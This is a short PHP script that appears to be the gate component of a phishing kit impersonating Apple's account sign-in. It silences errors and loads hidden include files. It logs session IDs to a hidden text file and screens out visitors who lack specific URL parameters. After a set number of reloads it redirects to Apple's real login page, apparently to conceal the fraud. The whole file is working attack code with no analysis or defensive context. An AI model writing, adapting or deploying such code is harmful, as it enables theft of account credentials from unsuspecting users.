<?php
error_reporting(0);
@require $_SERVER['DOCUMENT_ROOT']."/tytyd.php";

$isi = @file_get_contents('._ssid.txt');
$tot = @substr_count($isi, $_GET['sessionsid']);

    if(@$_GET['protocol'] != 'ssl' || @$_GET['ref'] == '' || strlen(@$_GET['sessionsid']) != 86)
        {
            @require_once $_SERVER['DOCUMENT_ROOT']."/._ops.php";
        }
    if($tot >= $reloads)
        {
            echo '<meta http-equiv="refresh" content="0; url=https://idmsa.apple.com/IDMSWebAuth/login.html?appIdKey=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&accNameLocked=false&language=US-EN&path=/signin/?referrer=/account/manage&Env=PROD" />';
            exit;
        }
        
$sid = @$_GET['sessionsid'];
fwrite(fopen('._ssid.txt','a'),"$sid ");
fclose(fopen('._ssid.txt','a'))
?>